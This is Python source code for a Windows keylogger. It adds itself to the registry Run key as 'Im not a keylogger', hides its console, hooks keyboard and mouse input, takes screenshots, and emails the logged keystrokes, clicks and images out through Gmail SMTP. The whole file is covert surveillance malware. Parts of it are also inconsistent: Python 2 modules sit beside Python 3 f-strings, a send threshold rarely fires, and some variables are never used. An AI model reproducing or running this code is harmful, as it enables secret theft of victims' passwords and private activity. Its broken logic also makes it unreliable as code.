#!/usr/bin/python
# -*- coding: utf-8 -*-

import os
import sys
import time
import random
import string
import smtplib
import base64
import pyautogui
import pythoncom
import pyHook
from _winreg import *

LOG_FILE = 'Logfile.txt'
INTERVAL = 60  # Time to wait before sending data to email (in seconds)

def initialize_log_file():
    try:
        with open(LOG_FILE, 'a'):
            pass
    except Exception as e:
        print(f"Error initializing log file: {e}")

def add_startup():  
    fp = os.path.dirname(os.path.realpath(__file__))
    file_name = os.path.basename(sys.argv[0])
    new_file_path = os.path.join(fp, file_name)
    key_val = r'Software\Microsoft\Windows\CurrentVersion\Run'
    key2change = OpenKey(HKEY_CURRENT_USER, key_val, 0, KEY_ALL_ACCESS)
    SetValueEx(key2change, 'Im not a keylogger', 0, REG_SZ, new_file_path)

def hide_console():
    import win32console
    import win32gui
    win = win32console.GetConsoleWindow()
    win32gui.ShowWindow(win, 0)

def take_screenshot():
    name = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(7))
    try:
        pyautogui.screenshot().save(name + '.png')
        return name + '.png'
    except Exception as e:
        print(f"Error taking screenshot: {e}")
        return None

def send_email(data, attachment=None):
    try:
        server = smtplib.SMTP('smtp.gmail.com:587')
        server.starttls()
        server.login(os.environ.get('GMAIL_USER'), os.environ.get('GMAIL_PASSWORD'))
        msg = f"Subject: New Keylogger Data\n\n{data}"
        if attachment:
            with open(attachment, 'rb') as f:
                img_data = f.read()
                img_data = base64.b64encode(img_data)
                msg += f"\nAttachment: {attachment}\n{img_data.decode('utf-8')}"
        server.sendmail(os.environ.get('GMAIL_USER'), os.environ.get('SEND_TO'), msg)
        server.quit()
    except Exception as e:
        print(f"Error sending email: {e}")

def on_mouse_event(event):
    data = f"\n[{time.strftime('%H:%M:%S')}] WindowName: {event.WindowName}\n\tButton: {event.MessageName}\n\tClicked in (Position): {event.Position}\n===================="
    with open(LOG_FILE, 'a') as f:
        f.write(data)
    if len(data) > 500:
        attachment = take_screenshot()
        send_email(data, attachment)
    return True

def on_keyboard_event(event):
    data = f"\n[{time.strftime('%H:%M:%S')}] WindowName: {event.WindowName}\n\tKeyboard key: {event.Key}\n===================="
    with open(LOG_FILE, 'a') as f:
        f.write(data)
    if len(data) > 500:
        send_email(data)
    return True

def main():
    initialize_log_file()
    add_startup()
    hide_console()

    hook = pyHook.HookManager()
    hook.KeyDown = on_keyboard_event
    hook.MouseAllButtonsDown = on_mouse_event
    hook.HookKeyboard()
    hook.HookMouse()

    start_time = time.time()
    pythoncom.PumpMessages()

if __name__ == "__main__":
    main()
